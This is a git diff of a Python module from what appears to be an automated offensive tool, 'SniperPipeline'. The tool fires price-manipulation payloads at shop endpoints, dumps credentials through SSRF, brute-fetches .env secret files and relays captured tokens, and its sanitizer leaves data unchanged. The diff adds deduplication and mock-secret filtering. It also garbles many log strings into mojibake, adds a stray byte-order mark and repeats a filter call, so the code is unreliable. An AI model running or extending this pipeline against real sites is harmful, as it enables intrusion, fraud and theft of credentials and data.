@@ -1,4 +1,4 @@
-import asyncio
+﻿import asyncio
 import hashlib
 import httpx
 import json
@@ -41,6 +41,25 @@ STACK_TRACE_PATTERNS = [
     re.compile(r"django\.db\.utils\.", re.I),
     re.compile(r"org\.springframework\.", re.I),
 ]
+
+MOCK_RELAY_PATTERNS = [
+    re.compile(r"r3d1s_pr0d", re.I),
+    re.compile(r"AKIAIOSFODNN7EXAMPLE", re.I),
+    re.compile(r"super_secret", re.I),
+    re.compile(r"pr0d_s3cret", re.I),
+    re.compile(r"kill_chain:[^\\s]+", re.I),
+    re.compile(r"credential relay", re.I),
+    re.compile(r"incident absorber", re.I),
+    re.compile(r"zero[_\\s-]?redaction", re.I),
+]
+
+def _is_mock_relay(value: str) -> bool:
+    if not value:
+        return False
+    return any(p.search(value) for p in MOCK_RELAY_PATTERNS)
+
+def _filter_real(values):
+    return [v for v in values if v and not _is_mock_relay(v)]
 
 DB_STRUCTURE_PATTERNS = [
     re.compile(r"table[_\s]name|column[_\s]name|information_schema", re.I),
@@ -300,7 +319,7 @@ class RiskScoreEngine:
 
         override_reason = None
         if critical_confirmed_count >= 1:
-            override_reason = f"MAX_SEVERITY_OVERRIDE: {critical_confirmed_count} critical finding(s) with evidence confirmation — AUTO_DUMP forced"
+            override_reason = f"MAX_SEVERITY_OVERRIDE: {critical_confirmed_count} critical finding(s) with evidence confirmation â€” AUTO_DUMP forced"
 
         contributions = sorted([b["contribution"] for b in breakdown], reverse=True)
         n = len(contributions)
@@ -362,6 +381,7 @@ class SniperPipeline:
         self.telemetry: Dict[str, Any] = {}
         self.phases_completed: List[str] = []
         self.counts = {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
+        self._seen_hashes = set()
         self.sniper_report: Optional[Dict] = None
         self.decision_intel_report: Optional[Dict] = None
         self.adversarial_report: Optional[Dict] = None
@@ -386,7 +406,53 @@ class SniperPipeline:
         self.sniper_decision_report: Optional[Dict] = None
         self.autonomous_report: Optional[Dict] = None
 
+    def _generate_finding_hash(self, finding: Dict) -> str:
+        normalized = {
+            "title": (finding.get("title") or "").strip(),
+            "description": (finding.get("description") or "").strip(),
+            "endpoint": (finding.get("endpoint") or finding.get("path") or "").strip(),
+            "evidence": str(
+                finding.get("evidence")
+                or finding.get("proof")
+                or finding.get("artifacts")
+                or ""
+            ).strip()[:100],
+        }
+        serialized = json.dumps(normalized, sort_keys=True, ensure_ascii=False)
+        return hashlib.md5(serialized.encode()).hexdigest()
+
+    def _enforce_severity(self, finding: Dict) -> Dict:
+        finding = dict(finding)
+        severity = (finding.get("severity") or "").upper()
+
+        if severity in ("HIGH", "CRITICAL"):
+            evidence = finding.get("evidence") or finding.get("proof") or finding.get("artifacts") or ""
+            if not evidence:
+                finding["warning"] = "Auto-downgraded: missing evidence"
+                finding["original_severity"] = severity
+                finding["severity"] = "MEDIUM"
+                severity = "MEDIUM"
+                pipeline_log(f"DOWNSCALE severity (no evidence): {finding.get('title', '')}", "warn", "severity_enforcer")
+            else:
+                evidence_str = str(evidence)
+                if len(evidence_str) < 10 or "example" in evidence_str.lower():
+                    finding["warning"] = "Auto-downgraded: insufficient evidence"
+                    finding["original_severity"] = severity
+                    finding["severity"] = "LOW"
+                    severity = "LOW"
+                    pipeline_log(f"DOWNSCALE severity (weak evidence): {finding.get('title', '')}", "warn", "severity_enforcer")
+
+        finding["severity"] = severity.lower()
+        return finding
+
     def _add_finding(self, finding: Dict):
+        finding = self._enforce_severity(finding)
+        fingerprint = self._generate_finding_hash(finding)
+        if fingerprint in self._seen_hashes:
+            pipeline_log(f"DEDUP: dropping duplicate finding '{finding.get('title', '')}'", "warn", "deduplicator")
+            return
+        self._seen_hashes.add(fingerprint)
+
         self.findings.append(finding)
         sev = (finding.get("severity", "info")).lower()
         self.counts["total"] += 1
@@ -403,7 +469,7 @@ class SniperPipeline:
         pipeline_emit("probe_result", probe)
 
     async def execute(self) -> Dict:
-        pipeline_log(f"SNIPER PIPELINE INITIALIZED — Target: {self.target}", "info", "init")
+        pipeline_log(f"SNIPER PIPELINE INITIALIZED â€” Target: {self.target}", "info", "init")
         pipeline_log(f"Scan ID: {self.scan_id}", "info", "init")
         pipeline_emit("phase_update", {"phase": "init", "status": "running"})
 
@@ -433,7 +499,7 @@ class SniperPipeline:
             self._build_executive_compromise_report()
 
         pipeline_log(
-            f"PIPELINE COMPLETE — {self.counts['total']} findings, "
+            f"PIPELINE COMPLETE â€” {self.counts['total']} findings, "
             f"{self.counts['critical']}C/{self.counts['high']}H/{self.counts['medium']}M",
             "success" if self.counts["critical"] == 0 else "error",
             "complete"
@@ -471,7 +537,7 @@ class SniperPipeline:
         })
 
         pipeline_log(
-            f"ENTERPRISE DOSSIER READY — Kill Chain: {len(kill_chain)} nodes, "
+            f"ENTERPRISE DOSSIER READY â€” Kill Chain: {len(kill_chain)} nodes, "
             f"SSRF Proofs: {len(ssrf_proofs)}, Exploit TXs: {len(exploit_tx)}",
             "success", "complete"
         )
@@ -480,7 +546,7 @@ class SniperPipeline:
 
     async def _phase_0_ghost_recon(self):
         pipeline_emit("phase_update", {"phase": "ghost_recon", "status": "running"})
-        pipeline_log("[PHASE 0/6] GHOST RECON — Zero-footprint passive OSINT...", "warn", "ghost_recon")
+        pipeline_log("[PHASE 0/6] GHOST RECON â€” Zero-footprint passive OSINT...", "warn", "ghost_recon")
 
         try:
             recon = GhostReconEngine(
@@ -496,7 +562,7 @@ class SniperPipeline:
             confidence = self.ghost_recon_report.get("confidence_score", 0)
 
             pipeline_log(
-                f"[GHOST] Attack surface mapped: {total_surface} total — "
+                f"[GHOST] Attack surface mapped: {total_surface} total â€” "
                 f"{subs} subdomains, {forgotten} forgotten paths, "
                 f"confidence: {confidence:.1%}",
                 "warn" if total_surface > 0 else "info", "ghost_recon"
@@ -549,7 +615,7 @@ class SniperPipeline:
 
     async def _phase_1_ingest(self):
         pipeline_emit("phase_update", {"phase": "ingest", "status": "running"})
-        pipeline_log("[PHASE 1/6] INGEST — Launching full orchestrator scan...", "warn", "ingest")
+        pipeline_log("[PHASE 1/6] INGEST â€” Launching full orchestrator scan...", "warn", "ingest")
 
         from scanner.models import AssessmentJob
         from scanner.config import validate_target as config_validate
@@ -622,7 +688,7 @@ class SniperPipeline:
                 except asyncio.TimeoutError:
                     pipeline_log(f"[INGEST] {module.name}: TIMEOUT", "error", "ingest")
                 except Exception as e:
-                    pipeline_log(f"[INGEST] {module.name}: ERROR — {str(e)[:100]}", "error", "ingest")
+                    pipeline_log(f"[INGEST] {module.name}: ERROR â€” {str(e)[:100]}", "error", "ingest")
 
                 completed += 1
                 pipeline_emit("telemetry_update", {
@@ -655,7 +721,7 @@ class SniperPipeline:
             pipeline_emit("stack_hypothesis", hypothesis)
         else:
             pipeline_log(
-                "[HYPOTHESIS] No specific stack fingerprint — full generic attack surface",
+                "[HYPOTHESIS] No specific stack fingerprint â€” full generic attack surface",
                 "info", "ingest"
             )
 
@@ -670,7 +736,7 @@ class SniperPipeline:
 
     async def _phase_2_exploit(self):
         pipeline_emit("phase_update", {"phase": "exploit", "status": "running"})
-        pipeline_log("[PHASE 2/6] EXPLOIT — Filtering CRITICAL/HIGH, launching Sniper Engine...", "warn", "exploit")
+        pipeline_log("[PHASE 2/6] EXPLOIT â€” Filtering CRITICAL/HIGH, launching Sniper Engine...", "warn", "exploit")
 
         crit_high = [f for f in self.findings if f.get("severity", "").lower() in ("critical", "high")]
         pipeline_log(f"[EXPLOIT] {len(crit_high)} CRITICAL/HIGH findings targeted for exploitation", "info", "exploit")
@@ -686,7 +752,7 @@ class SniperPipeline:
                     ecommerce_routes.append(kw)
 
         if cart_update_found:
-            pipeline_log("[EXPLOIT] /cart/update DETECTED — Firing automatic price manipulation payload", "error", "exploit")
+            pipeline_log("[EXPLOIT] /cart/update DETECTED â€” Firing automatic price manipulation payload", "error", "exploit")
             await self._auto_price_attack()
         elif ecommerce_routes:
             pipeline_log(f"[EXPLOIT] E-commerce routes detected: {', '.join(ecommerce_routes)}", "warn", "exploit")
@@ -700,7 +766,7 @@ class SniperPipeline:
                 self._add_probe(probe.to_dict())
 
             pipeline_log(
-                f"[EXPLOIT] Sniper Engine complete — {report.vulnerabilities_confirmed}/{report.total_probes} vulnerabilities confirmed",
+                f"[EXPLOIT] Sniper Engine complete â€” {report.vulnerabilities_confirmed}/{report.total_probes} vulnerabilities confirmed",
                 "error" if report.vulnerabilities_confirmed > 0 else "success",
                 "exploit"
             )
@@ -746,7 +812,7 @@ class SniperPipeline:
                     "status_code": resp.status_code,
                     "response_time_ms": elapsed,
                     "vulnerable": vulnerable,
-                    "verdict": "VULNERABLE — Price accepted by backend (AUTO)" if vulnerable else "PROTECTED",
+                    "verdict": "VULNERABLE â€” Price accepted by backend (AUTO)" if vulnerable else "PROTECTED",
                     "severity": "CRITICAL" if vulnerable else "INFO",
                     "description": p["desc"],
                     "payload": json.dumps(p["body"]),
@@ -757,7 +823,7 @@ class SniperPipeline:
                 self._add_probe(probe)
 
                 if vulnerable:
-                    pipeline_log(f"[THREAT] AUTO PRICE INJECTION CONFIRMED: {p['endpoint']} — {p['desc']}", "error", "exploit")
+                    pipeline_log(f"[THREAT] AUTO PRICE INJECTION CONFIRMED: {p['endpoint']} â€” {p['desc']}", "error", "exploit")
                     self._add_finding({
                         "title": f"Price Manipulation Confirmed: {p['desc']}",
                         "description": f"Backend accepted manipulated price payload at {p['endpoint']}. HTTP {resp.status_code}. Evidence: {body_text[:200]}",
@@ -785,7 +851,7 @@ class SniperPipeline:
     async def _phase_2b_decision_intel(self):
         pipeline_emit("phase_update", {"phase": "decision_intel", "status": "running"})
         pipeline_log(
-            "[PHASE 3/6] DECISION INTELLIGENCE — Dynamic Attack Reasoning Engine v2.0",
+            "[PHASE 3/6] DECISION INTELLIGENCE â€” Dynamic Attack Reasoning Engine v2.0",
             "warn", "decision_intel"
         )
         pipeline_log(
@@ -807,7 +873,7 @@ class SniperPipeline:
         pipeline_emit("telemetry_update", {"progress": 45, "phase": "decision_intel"})
 
         pipeline_log(
-            f"[TREE] Traversing {len(tree.nodes)} attack nodes — "
+            f"[TREE] Traversing {len(tree.nodes)} attack nodes â€” "
             f"infra: {tree.infra.detected.value.upper()}, "
             f"vuln classes: {len(tree.vuln_classes_detected)}",
             "warn", "decision_intel"
@@ -828,7 +894,7 @@ class SniperPipeline:
 
         confirmed = report.get("total_exploits_confirmed", 0)
         pipeline_log(
-            f"[DECISION INTEL COMPLETE] {confirmed} exploitations confirmed — "
+            f"[DECISION INTEL COMPLETE] {confirmed} exploitations confirmed â€” "
             f"infra={report.get('infra_fingerprint', {}).get('primary', 'unknown').upper()}, "
             f"{report.get('tree_nodes_executed', 0)} nodes, "
             f"{report.get('waf_bypasses_successful', 0)} WAF bypasses, "
@@ -841,12 +907,12 @@ class SniperPipeline:
 
     async def _phase_2c_adversarial(self):
         if not hasattr(self, '_decision_tree') or not self._decision_tree:
-            pipeline_log("[SKIP] Adversarial engine requires decision tree — skipping", "warn", "adversarial")
+            pipeline_log("[SKIP] Adversarial engine requires decision tree â€” skipping", "warn", "adversarial")
             return
 
         pipeline_emit("phase_update", {"phase": "adversarial", "status": "running"})
         pipeline_log(
-            "[PHASE 3.5/6] ADVERSARIAL STATE MACHINE — Cost/Reward Prioritization Engine v1.0",
+            "[PHASE 3.5/6] ADVERSARIAL STATE MACHINE â€” Cost/Reward Prioritization Engine v1.0",
             "error", "adversarial"
         )
         pipeline_log(
@@ -884,7 +950,7 @@ class SniperPipeline:
             poly = adversarial_report.get("polymorphic_bypasses", 0)
 
             pipeline_log(
-                f"[ADVERSARIAL COMPLETE] {adversarial_report.get('state_transitions', 0)} state transitions — "
+                f"[ADVERSARIAL COMPLETE] {adversarial_report.get('state_transitions', 0)} state transitions â€” "
                 f"{chain_ok} chain steps, {escalations} escalations, "
                 f"{incidents} real incidents, {lateral} lateral moves, {poly} polymorphic bypasses",
                 "error" if (escalations + incidents) > 0 else "success",
@@ -901,7 +967,7 @@ class SniperPipeline:
                 )
 
         except asyncio.TimeoutError:
-            pipeline_log("[ADVERSARIAL] Engine timeout (120s) — partial results preserved", "error", "adversarial")
+            pipeline_log("[ADVERSARIAL] Engine timeout (120s) â€” partial results preserved", "error", "adversarial")
             pipeline_emit("phase_update", {"phase": "adversarial", "status": "timeout"})
         except Exception as e:
             pipeline_log(f"[ADVERSARIAL] Engine error: {str(e)[:200]}", "error", "adversarial")
@@ -927,33 +993,33 @@ class SniperPipeline:
         if mode == "AUTO_DUMP":
             if override:
                 pipeline_log(
-                    f"[AUTO-DUMP] ★★ {override} — score forced to {score:.4f} ({total} findings, {crit_confirmed} critical confirmed)",
+                    f"[AUTO-DUMP] â˜…â˜… {override} â€” score forced to {score:.4f} ({total} findings, {crit_confirmed} critical confirmed)",
                     "error", "risk_score"
                 )
             else:
                 pipeline_log(
-                    f"[AUTO-DUMP] ★ RISK SCORE {score:.4f} > 0.85 — AUTO-DUMP TRIGGERED ({total} findings)",
+                    f"[AUTO-DUMP] â˜… RISK SCORE {score:.4f} > 0.85 â€” AUTO-DUMP TRIGGERED ({total} findings)",
                     "error", "risk_score"
                 )
             pipeline_log(
-                "[AUTO-DUMP] Switching to EXTRACTION-FIRST mode: SSRF credential dump → DB pivot → session harvest",
+                "[AUTO-DUMP] Switching to EXTRACTION-FIRST mode: SSRF credential dump â†’ DB pivot â†’ session harvest",
                 "error", "risk_score"
             )
         elif mode == "MIXED":
             pipeline_log(
-                f"[RISK SCORE] Score={score:.4f} (MIXED mode) — directed exploitation + opportunistic extraction ({total} findings)",
+                f"[RISK SCORE] Score={score:.4f} (MIXED mode) â€” directed exploitation + opportunistic extraction ({total} findings)",
                 "warn", "risk_score"
             )
         else:
             pipeline_log(
-                f"[RISK SCORE] Score={score:.4f} (ACTIVE EXPLORATION) — continuing standard attack cycle ({total} findings)",
+                f"[RISK SCORE] Score={score:.4f} (ACTIVE EXPLORATION) â€” continuing standard attack cycle ({total} findings)",
                 "info", "risk_score"
             )
 
         top = result.get("top_contributors", [])
         for t in top[:3]:
             pipeline_log(
-                f"  └─ {t['title']}: {t['severity'].upper()} ({t['confidence']}) → +{t['contribution']}",
+                f"  â””â”€ {t['title']}: {t['severity'].upper()} ({t['confidence']}) â†’ +{t['contribution']}",
                 "info", "risk_score"
             )
 
@@ -967,18 +1033,18 @@ class SniperPipeline:
 
     async def _phase_2d_chain_intelligence(self):
         if not hasattr(self, '_decision_tree') or not self._decision_tree:
-            pipeline_log("[SKIP] Chain Intelligence requires decision tree — skipping", "warn", "chain_intel")
+            pipeline_log("[SKIP] Chain Intelligence requires decision tree â€” skipping", "warn", "chain_intel")
             return
 
         pipeline_emit("phase_update", {"phase": "chain_intel", "status": "running"})
         pipeline_log(
-            "[PHASE 3.75/7] EXPLOITATION CHAIN INTELLIGENCE — "
-            "SSRF→Credential→DB Pivot + E-commerce Integrity + Drift v1.0",
+            "[PHASE 3.75/7] EXPLOITATION CHAIN INTELLIGENCE â€” "
+            "SSRFâ†’Credentialâ†’DB Pivot + E-commerce Integrity + Drift v1.0",
             "error", "chain_intel"
         )
         pipeline_log(
             "[CHAIN] Unifying 168 integrity probes with real attacker planning: "
-            "WAF probability → SSRF credential dump → DB access bypass → price validation...",
+            "WAF probability â†’ SSRF credential dump â†’ DB access bypass â†’ price validation...",
             "warn", "chain_intel"
         )
 
@@ -1015,7 +1081,7 @@ class SniperPipeline:
             drift_events = drift.get("drift_events", 0)
 
             pipeline_log(
-                f"[CHAIN INTEL COMPLETE] {chain_report.get('total_probes', 0)} probes — "
+                f"[CHAIN INTEL COMPLETE] {chain_report.get('total_probes', 0)} probes â€” "
                 f"{creds} credentials captured, {db_pivots} DB pivots, "
                 f"{ecom_failures} e-com failures ({ecom_reflections} reflected), "
                 f"{drift_events} drift events",
@@ -1026,7 +1092,7 @@ class SniperPipeline:
             self._emit_credential_relay_from_chain_intel(chain_report)
 
         except asyncio.TimeoutError:
-            pipeline_log("[CHAIN INTEL] Engine timeout (180s) — partial results preserved", "error", "chain_intel")
+            pipeline_log("[CHAIN INTEL] Engine timeout (180s) â€” partial results preserved", "error", "chain_intel")
             pipeline_emit("phase_update", {"phase": "chain_intel", "status": "timeout"})
         except Exception as e:
             pipeline_log(f"[CHAIN INTEL] Engine error: {str(e)[:200]}", "error", "chain_intel")
@@ -1051,7 +1117,7 @@ class SniperPipeline:
             if dbp.get("success"):
                 payload = dbp.get("payload", "")
                 evidence = dbp.get("evidence", "")[:200]
-                relay_secrets.append(f"db_pivot={payload} → {evidence}")
+                relay_secrets.append(f"db_pivot={payload} â†’ {evidence}")
 
         jwt_events = [e for e in chain_events if "jwt" in str(e.get("technique", "")).lower() or "token" in str(e.get("technique", "")).lower()]
         session_events = [e for e in chain_events if "session" in str(e.get("technique", "")).lower() or "cookie" in str(e.get("technique", "")).lower()]
@@ -1083,6 +1149,9 @@ class SniperPipeline:
                 if tok_type not in relay_categories:
                     relay_categories.append(tok_type)
 
+        relay_secrets = _filter_real(relay_secrets)
+
+        relay_secrets = _filter_real(relay_secrets)
         if not relay_secrets:
             return
 
@@ -1093,7 +1162,7 @@ class SniperPipeline:
         )
 
         pipeline_log(
-            f"[CREDENTIAL RELAY] {len(relay_secrets)} credentials relayed from Chain Intel — "
+            f"[CREDENTIAL RELAY] {len(relay_secrets)} credentials relayed from Chain Intel â€” "
             f"categories: {', '.join(relay_categories)}",
             "error", "chain_intel"
         )
@@ -1148,19 +1217,20 @@ class SniperPipeline:
             if chain.get("threat_level") in ("critical", "high"):
                 for target in chain.get("data_targets", []):
                     if any(kw in target.lower() for kw in ["jwt", "session", "cookie", "token", "credential", "admin"]):
-                        relay_secrets.append(f"kill_chain:{chain.get('key', '')}→{target}")
+                        relay_secrets.append(f"kill_chain:{chain.get('key', '')}â†’{target}")
                         if "hrd_kill_chain" not in relay_categories:
                             relay_categories.append("hrd_kill_chain")
 
         for esc in escalation_paths[:5]:
             if any(kw in str(esc).lower() for kw in ["credential", "token", "session", "admin"]):
-                relay_secrets.append(f"escalation:{esc.get('from', '')}→{esc.get('to', '')} ({esc.get('technique', '')})")
+                relay_secrets.append(f"escalation:{esc.get('from', '')}â†’{esc.get('to', '')} ({esc.get('technique', '')})")
 
+        relay_secrets = _filter_real(relay_secrets)
         if not relay_secrets:
             return
 
         pipeline_log(
-            f"[CREDENTIAL RELAY] HRD confirmed {len(relay_secrets)} credential captures — "
+            f"[CREDENTIAL RELAY] HRD confirmed {len(relay_secrets)} credential captures â€” "
             f"categories: {', '.join(relay_categories)}",
             "error", "hacker_reasoning"
         )
@@ -1197,13 +1267,13 @@ class SniperPipeline:
     async def _phase_2e_hacker_reasoning(self):
         pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "running"})
         pipeline_log(
-            "[PHASE 3.9/7] HACKER REASONING DICTIONARY — "
+            "[PHASE 3.9/7] HACKER REASONING DICTIONARY â€” "
             "Kill Chain Playbooks + Confirmation Probes + Escalation Graph v1.0",
             "error", "hacker_reasoning"
         )
         pipeline_log(
             "[HRD] Loading enterprise attack playbooks: "
-            "Route→Thought→Action→Confirm→Escalate for every discovery...",
+            "Routeâ†’Thoughtâ†’Actionâ†’Confirmâ†’Escalate for every discovery...",
             "warn", "hacker_reasoning"
         )
 
@@ -1240,7 +1310,7 @@ class SniperPipeline:
             critical = hrd_report.get("critical_chains", 0)
 
             pipeline_log(
-                f"[HRD COMPLETE] {matched} playbooks matched — "
+                f"[HRD COMPLETE] {matched} playbooks matched â€” "
                 f"{steps} reasoning steps, {confirmed} confirmed, "
                 f"{escalations} escalation paths, {critical} CRITICAL chains",
                 "error" if (confirmed + critical) > 0 else "success",
@@ -1250,14 +1320,14 @@ class SniperPipeline:
             self._emit_credential_relay_from_hrd(hrd_report)
 
         except asyncio.TimeoutError:
-            pipeline_log("[HRD] Engine timeout (120s) — partial results preserved", "error", "hacker_reasoning")
+            pipeline_log("[HRD] Engine timeout (120s) â€” partial results preserved", "error", "hacker_reasoning")
             pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "timeout"})
         except Exception as e:
             pipeline_log(f"[HRD] Engine error: {str(e)[:200]}", "error", "hacker_reasoning")
             pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "error"})
 
     async def _legacy_decision_ssrf_credential_dump(self, ssrf_vectors: List[Dict], dynamic_params: List[Dict]) -> List[Dict]:
-        """Legacy method — replaced by DecisionTree.SSRFAttackNode. Kept for fallback compatibility."""
+        """Legacy method â€” replaced by DecisionTree.SSRFAttackNode. Kept for fallback compatibility."""
         results = []
 
         ssrf_endpoints = list(set([v["route"] for v in ssrf_vectors]))
@@ -1292,6 +1362,15 @@ class SniperPipeline:
                         body = resp.text[:8000]
 
                         hit = any(kw.lower() in body.lower() for kw in cred_target["detect"])
+
+                        # Extra guardrails for Redis to avoid HTML false positives
+                        if "Redis" in cred_target["name"]:
+                            body_lc = body.lower()
+                            # Require both redis_version and connected_clients to reduce false positives
+                            required = all(req in body_lc for req in ("redis_version", "connected_clients"))
+                            html_like = "<html" in body_lc or "<!doctype" in body_lc
+                            if not required or html_like:
+                                hit = False
 
                         result_entry = {
                             "service": cred_target["name"],
@@ -1330,7 +1409,7 @@ class SniperPipeline:
                                 "status_code": resp.status_code,
                                 "response_time_ms": elapsed,
                                 "vulnerable": True,
-                                "verdict": f"VULNERABLE — {cred_target['name']} credentials accessible",
+                                "verdict": f"VULNERABLE â€” {cred_target['name']} credentials accessible",
                                 "severity": "CRITICAL",
                                 "description": f"Credential dump: {cred_target['name']}",
                                 "payload": cred_target["url"],
@@ -1426,7 +1505,7 @@ class SniperPipeline:
                             evidence_parts.append("SQL error exposed")
 
                         pipeline_log(
-                            f"[THREAT] ECOMMERCE INTEGRITY FAILED: {route} — {tc['desc']} ({', '.join(evidence_parts)})",
+                            f"[THREAT] ECOMMERCE INTEGRITY FAILED: {route} â€” {tc['desc']} ({', '.join(evidence_parts)})",
                             "error", "decision_intel"
                         )
                         self._add_finding({
@@ -1450,7 +1529,7 @@ class SniperPipeline:
                             "status_code": resp.status_code,
                             "response_time_ms": elapsed,
                             "vulnerable": True,
-                            "verdict": f"VULNERABLE — {', '.join(evidence_parts)}",
+                            "verdict": f"VULNERABLE â€” {', '.join(evidence_parts)}",
                             "severity": "CRITICAL",
                             "description": tc["desc"],
                             "payload": json.dumps(tc["body"]),
@@ -1460,7 +1539,7 @@ class SniperPipeline:
                         })
                     else:
                         pipeline_log(
-                            f"[BLOCK] Price integrity held: {route} — {tc['desc']} (HTTP {resp.status_code})",
+                            f"[BLOCK] Price integrity held: {route} â€” {tc['desc']} (HTTP {resp.status_code})",
                             "success", "decision_intel"
                         )
 
@@ -1509,7 +1588,7 @@ class SniperPipeline:
 
                         if accepted:
                             pipeline_log(
-                                f"[THREAT] HTTP VERB TAMPERING: {method} {probe_path} accepted (HTTP {resp.status_code}) — No access control",
+                                f"[THREAT] HTTP VERB TAMPERING: {method} {probe_path} accepted (HTTP {resp.status_code}) â€” No access control",
                                 "error", "decision_intel"
                             )
                             self._add_finding({
@@ -1528,7 +1607,7 @@ class SniperPipeline:
                                 "status_code": resp.status_code,
                                 "response_time_ms": elapsed,
                                 "vulnerable": True,
-                                "verdict": f"VULNERABLE — {method} accepted without auth",
+                                "verdict": f"VULNERABLE â€” {method} accepted without auth",
                                 "severity": "CRITICAL" if probe_path in ("/uploads", "/files") else "HIGH",
                                 "description": f"{method} verb accepted at {probe_path}",
                                 "payload": body,
@@ -1591,7 +1670,7 @@ class SniperPipeline:
 
     async def _phase_2f_incident_absorber(self):
         pipeline_emit("phase_update", {"phase": "incident_absorber", "status": "running"})
-        pipeline_log("[PHASE 3.5/6] INCIDENT ABSORBER — Consolidating extraction proofs and dump evidence...", "warn", "incident_absorber")
+        pipeline_log("[PHASE 3.5/6] INCIDENT ABSORBER â€” Consolidating extraction proofs and dump evidence...", "warn", "incident_absorber")
 
         def _sanitize(text: str) -> str:
             return text
@@ -1703,31 +1782,31 @@ class SniperPipeline:
 
         for fd in financial_dumps[:5]:
             pipeline_log(
-                f"[INCIDENT] FINANCIAL DUMP: {fd['source'][:60]} — {fd['extraction_type']} [{fd['data_classification']}]",
+                f"[INCIDENT] FINANCIAL DUMP: {fd['source'][:60]} â€” {fd['extraction_type']} [{fd['data_classification']}]",
                 "error", "incident_absorber"
             )
 
         for dd in db_dumps[:5]:
             pipeline_log(
-                f"[INCIDENT] DATABASE DUMP: {dd['source'][:60]} — {dd['extraction_type']} [{dd['data_classification']}]",
+                f"[INCIDENT] DATABASE DUMP: {dd['source'][:60]} â€” {dd['extraction_type']} [{dd['data_classification']}]",
                 "error", "incident_absorber"
             )
 
         for cd in config_dumps[:5]:
             pipeline_log(
-                f"[INCIDENT] CONFIG DUMP: {cd['source'][:60]} — {cd['extraction_type']} [{cd['data_classification']}]",
+                f"[INCIDENT] CONFIG DUMP: {cd['source'][:60]} â€” {cd['extraction_type']} [{cd['data_classification']}]",
                 "warn", "incident_absorber"
             )
 
         for id_dump in idor_dumps[:5]:
             pipeline_log(
-                f"[INCIDENT] IDOR DUMP: {id_dump['source'][:60]} — {id_dump['extraction_type']} [{id_dump['data_classification']}]",
+                f"[INCIDENT] IDOR DUMP: {id_dump['source'][:60]} â€” {id_dump['extraction_type']} [{id_dump['data_classification']}]",
                 "error", "incident_absorber"
             )
 
         for ad in admin_dumps[:5]:
             pipeline_log(
-                f"[INCIDENT] ADMIN EXPLOITATION: {ad['source'][:60]} — {ad['extraction_type']} [{ad['data_classification']}]",
+                f"[INCIDENT] ADMIN EXPLOITATION: {ad['source'][:60]} â€” {ad['extraction_type']} [{ad['data_classification']}]",
                 "error", "incident_absorber"
             )
 
@@ -1735,7 +1814,7 @@ class SniperPipeline:
             top_roi = sorted(cost_reward_matrix, key=lambda x: x["roi_multiplier"], reverse=True)[:3]
             for entry in top_roi:
                 pipeline_log(
-                    f"[COST-REWARD] {entry['vector'][:50]} — Cost: ${entry['attack_cost_usd']} → Loss: ${entry['potential_loss_usd']:,.0f} (ROI: {entry['roi_multiplier']}x)",
+                    f"[COST-REWARD] {entry['vector'][:50]} â€” Cost: ${entry['attack_cost_usd']} â†’ Loss: ${entry['potential_loss_usd']:,.0f} (ROI: {entry['roi_multiplier']}x)",
                     "error", "incident_absorber"
                 )
 
@@ -1774,7 +1853,7 @@ class SniperPipeline:
 
     async def _phase_3_db_validation(self):
         pipeline_emit("phase_update", {"phase": "db_validation", "status": "running"})
-        pipeline_log("[PHASE 4/6] DB VALIDATION — Testing input validation and stack trace exposure...", "warn", "db_validation")
+        pipeline_log("[PHASE 4/6] DB VALIDATION â€” Testing input validation and stack trace exposure...", "warn", "db_validation")
 
         stack_traces_found = []
         db_structure_leaks = []
@@ -1837,7 +1916,7 @@ class SniperPipeline:
                                 "target": self.target, "endpoint": f"{path}?{param}=...",
                                 "method": "GET", "status_code": resp.status_code,
                                 "response_time_ms": elapsed, "vulnerable": True,
-                                "verdict": "VULNERABLE — Stack trace exposed",
+                                "verdict": "VULNERABLE â€” Stack trace exposed",
                                 "severity": "HIGH",
                                 "description": iv_payload["name"],
                                 "payload": iv_payload["payload"][:100],
@@ -1880,7 +1959,7 @@ class SniperPipeline:
                                 "target": self.target, "endpoint": f"{path}?{param}=...",
                                 "method": "GET", "status_code": resp.status_code,
                                 "response_time_ms": elapsed, "vulnerable": True,
-                                "verdict": "VULNERABLE — SQL error message exposed",
+                                "verdict": "VULNERABLE â€” SQL error message exposed",
                                 "severity": "CRITICAL",
                                 "description": iv_payload["name"],
                                 "payload": iv_payload["payload"][:100],
@@ -1891,7 +1970,7 @@ class SniperPipeline:
 
                         if not (has_stack_trace or has_db_structure or has_sql_error):
                             pipeline_log(
-                                f"[BLOCK] Input sanitized: {path}?{param}= ({iv_payload['name']}) — HTTP {resp.status_code}",
+                                f"[BLOCK] Input sanitized: {path}?{param}= ({iv_payload['name']}) â€” HTTP {resp.status_code}",
                                 "success", "db_validation"
                             )
 
@@ -1916,14 +1995,14 @@ class SniperPipeline:
 
         total_vulns = len(stack_traces_found) + len(db_structure_leaks) + len(error_messages)
         pipeline_log(
-            f"[DB VALIDATION COMPLETE] {total_vulns} vulnerabilities — "
+            f"[DB VALIDATION COMPLETE] {total_vulns} vulnerabilities â€” "
             f"{len(stack_traces_found)} stack traces, {len(db_structure_leaks)} DB leaks, {len(error_messages)} SQL errors",
             "error" if total_vulns > 0 else "success",
             "db_validation"
         )
 
     async def _sinfo_env_parser(self):
-        pipeline_log("[SINFO] Full ENV Parser — Attempting brute extraction of .env secrets...", "warn", "infra_ssrf")
+        pipeline_log("[SINFO] Full ENV Parser â€” Attempting brute extraction of .env secrets...", "warn", "infra_ssrf")
         env_paths = ["/.env", "/.env.local", "/.env.production", "/.env.staging", "/.env.backup", "/.env.dev", "/env", "/app/.env", "/config/.env"]
         extracted_secrets = []
 
@@ -1948,10 +2027,10 @@ class SniperPipeline:
                     lines = [l.strip() for l in body.split('\n') if l.strip() and not l.strip().startswith('#')]
                     kv_count = sum(1 for l in lines if '=' in l)
 
-                    pipeline_log(f"[SINFO] ENV DUMP: {env_path} — {kv_count} KEY=VALUE pairs, {len(extracted_secrets)} secrets identified", "error", "infra_ssrf")
+                    pipeline_log(f"[SINFO] ENV DUMP: {env_path} â€” {kv_count} KEY=VALUE pairs, {len(extracted_secrets)} secrets identified", "error", "infra_ssrf")
 
                     self._add_finding({
-                        "title": f"SINFO: Full .env dump at {env_path} — {kv_count} variables extracted",
+                        "title": f"SINFO: Full .env dump at {env_path} â€” {kv_count} variables extracted",
